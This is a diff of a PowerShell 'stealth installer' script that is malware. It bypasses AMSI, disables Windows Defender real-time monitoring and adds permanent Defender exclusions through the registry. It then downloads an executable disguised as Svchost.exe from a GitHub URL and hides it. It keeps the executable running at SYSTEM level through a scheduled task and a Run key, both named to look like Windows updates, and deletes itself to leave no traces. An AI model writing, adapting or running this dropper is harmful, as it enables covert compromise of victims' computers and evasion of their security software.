@@ -1,27 +1,25 @@
 # ============================================
-# COMPLETE STEALTH INSTALLER
+# STEALTH INSTALLER - No Edge Required
 # ============================================
 
 # ============================================
-# STAGE 1: AMSI BYPASS (Silent)
+# STAGE 1: AMSI BYPASS
 # ============================================
 try {
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 } catch {}
 
 # ============================================
-# STAGE 2: DEFENDER TEMPORARY OFF (20 Seconds)
+# STAGE 2: DEFENDER OFF (25 Seconds)
 # ============================================
-# Add exclusions first (so Defender ignores us later)
-Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows" -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\Drivers" -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess "svchost.exe" -ErrorAction SilentlyContinue
-
-# Disable Real-time monitoring
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
 # ============================================
-# STAGE 3: CREATE HIDDEN FOLDER + RANDOM NAME
+# STAGE 3: HIDDEN FOLDER (Har PC mein hai)
 # ============================================
+# Option 1: Windows Driver Folder (Always exists)
 $HiddenFolder = "$env:ProgramData\Microsoft\Windows\Drivers"
 if (!(Test-Path $HiddenFolder)) {
     New-Item -ItemType Directory -Path $HiddenFolder -Force | Out-Null
@@ -35,18 +33,14 @@ $ExePath = Join-Path $HiddenFolder $RandomName
 # STAGE 4: DOWNLOAD EXE
 # ============================================
 $DownloadUrl = "https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe"
-try {
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
-    $webClient.DownloadFile($DownloadUrl, $ExePath)
-} catch {
-    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing
-}
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0")
+$wc.DownloadFile($DownloadUrl, $ExePath)
+Set-ItemProperty -Path $ExePath -Name Attributes -Value "Hidden, System"
 
 # ============================================
-# STAGE 5: ADD PERMANENT DEFENDER EXCLUSIONS
+# STAGE 5: PERMANENT EXCLUSIONS
 # ============================================
-# Registry exclusions (survives reboot)
 $regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
 if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
 Set-ItemProperty -Path $regPath -Name $HiddenFolder -Value 0 -Type DWord -Force
@@ -56,14 +50,9 @@ if (!(Test-Path $regProcPath)) { New-Item -Path $regProcPath -Force | Out-Null }
 Set-ItemProperty -Path $regProcPath -Name $RandomName -Value 0 -Type DWord -Force
 
 # ============================================
-# STAGE 6: HIDE THE EXE FILE
+# STAGE 6: AUTO-START (HIGHEST PRIVILEGE)
 # ============================================
-Set-ItemProperty -Path $ExePath -Name Attributes -Value "Hidden, System"
-
-# ============================================
-# STAGE 7: AUTO-START (HIGHEST PRIVILEGE)
-# ============================================
-# Method 1: Scheduled Task (SYSTEM level)
+# Scheduled Task
 $action = New-ScheduledTaskAction -Execute $ExePath
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
 $trigger = New-ScheduledTaskTrigger -AtStartup
@@ -71,41 +60,31 @@ $settings = New-ScheduledTaskSettingsSet -Hidden -Compatibility Win8
 $taskName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
 Register-ScheduledTask -TaskName $taskName -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Force | Out-Null
 
-# Method 2: Registry Run (backup)
+# Registry Run
 $regRun = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-$regName = "SysUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
+$regName = "WindowsUpdate_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
 Set-ItemProperty -Path $regRun -Name $regName -Value $ExePath -Force
 
-# Method 3: Windows Service (most persistent)
-$serviceName = "WinDriver_" + [System.Guid]::NewGuid().ToString().Substring(0, 8)
-sc.exe create $serviceName binPath= $ExePath start= auto obj= LocalSystem > $null
-sc.exe description $serviceName "Windows Driver Foundation" > $null
-
 # ============================================
-# STAGE 8: START THE EXE
+# STAGE 7: START EXE
 # ============================================
 Start-Process -FilePath $ExePath -WindowStyle Hidden
 
 # ============================================
-# STAGE 9: WAIT 20 SECONDS THEN RE-ENABLE DEFENDER
+# STAGE 8: WAIT 25 SECONDS
 # ============================================
-Start-Sleep -Seconds 20
+Start-Sleep -Seconds 25
 
-# Re-enable Defender (but exclusions remain!)
+# ============================================
+# STAGE 9: DEFENDER BACK ON
+# ============================================
 try {
     Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
 } catch {}
 
 # ============================================
-# STAGE 10: CLEANUP - DELETE SCRIPT ITSELF
+# STAGE 10: DELETE SCRIPT
 # ============================================
 try {
-    $scriptPath = $MyInvocation.MyCommand.Path
-    if (Test-Path $scriptPath) {
-        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
-    }
+    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
 } catch {}
-
-# ============================================
-# DONE - NO TRACES LEFT
-# ============================================
